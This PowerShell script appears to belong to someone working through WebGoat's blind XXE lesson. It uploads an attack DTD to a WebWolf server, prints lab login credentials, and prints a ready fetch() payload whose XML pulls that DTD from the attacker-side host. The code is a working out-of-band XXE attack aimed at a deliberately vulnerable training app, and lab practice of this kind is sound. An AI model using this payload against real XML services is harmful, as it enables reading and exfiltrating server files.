# Upload DTD to Remote WebWolf
# Since local Python server can't be accessed by remote WebGoat

Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "  Upload DTD to Remote WebWolf" -ForegroundColor Cyan
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""

$dtdFile = "c:\webgoat-scripts-1\attack_remote.dtd"
$remoteWebWolf = "http://192.168.254.112:8002"

# Check if DTD exists
if (-not (Test-Path $dtdFile)) {
    Write-Host "ERROR: DTD file not found!" -ForegroundColor Red
    Write-Host "Looking for: $dtdFile" -ForegroundColor Yellow
    exit 1
}

Write-Host "✅ Found DTD file" -ForegroundColor Green
Write-Host ""

# Display DTD content
Write-Host "DTD Content:" -ForegroundColor Yellow
Get-Content $dtdFile | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray }
Write-Host ""

# Try uploading with curl
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "Attempting upload to WebWolf..." -ForegroundColor Yellow
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "Target: $remoteWebWolf/WebWolf/fileupload" -ForegroundColor White
Write-Host ""

try {
    $response = curl.exe -X POST -F "file=@$dtdFile" "$remoteWebWolf/WebWolf/fileupload" 2>&1
    
    Write-Host "Response:" -ForegroundColor Green
    Write-Host $response
    Write-Host ""
    
    Write-Host "=====================================================================" -ForegroundColor Cyan
    Write-Host "If successful, DTD should be at:" -ForegroundColor Green
    Write-Host "$remoteWebWolf/files/nooniman/attack_remote.dtd" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "Test it with:" -ForegroundColor White
    Write-Host "curl.exe $remoteWebWolf/files/nooniman/attack_remote.dtd" -ForegroundColor Gray
    Write-Host ""
    
} catch {
    Write-Host "Upload failed!" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Yellow
    Write-Host ""
}

Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "Alternative: Manual Upload" -ForegroundColor Yellow
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "1. Open: $remoteWebWolf/WebWolf" -ForegroundColor White
Write-Host "2. Login: nooniman / nooniman" -ForegroundColor White
Write-Host "3. Find 'Files' or 'File Upload' section" -ForegroundColor White
Write-Host "4. Upload: $dtdFile" -ForegroundColor White
Write-Host ""

Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "Next Step: Send XXE Attack" -ForegroundColor Green
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "After upload, run this in browser console:" -ForegroundColor White
Write-Host ""
Write-Host @"
fetch('http://192.168.254.112:8001/WebGoat/xxe/blind', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/xml'},
  body: ``<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://192.168.254.112:8002/files/nooniman/attack_remote.dtd">
  %remote;
]>
<comment><text>Blind XXE Attack</text></comment>``
}).then(r => r.text()).then(console.log);
"@ -ForegroundColor Gray

Write-Host ""
Write-Host "Then check: $remoteWebWolf/WebWolf - Incoming Requests" -ForegroundColor Yellow
